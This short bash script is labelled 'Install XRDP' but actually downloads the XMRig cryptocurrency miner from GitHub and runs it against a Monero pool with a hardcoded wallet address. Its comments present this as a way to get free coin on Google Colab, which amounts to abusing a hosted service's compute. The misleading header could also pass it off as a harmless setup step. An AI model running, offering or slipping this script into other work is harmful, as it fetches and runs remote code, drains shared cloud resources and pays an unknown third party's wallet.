#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 87rFgPznMoMFKLjuFZyH4ZbHTEGuuQrPnjcqC2eRNZUpSPTvFW9ZGPceGBEcU8vxqS4NRrYwxRk7G2HFVBGzBVPkTURwwdW -k --tls --rig-id GC
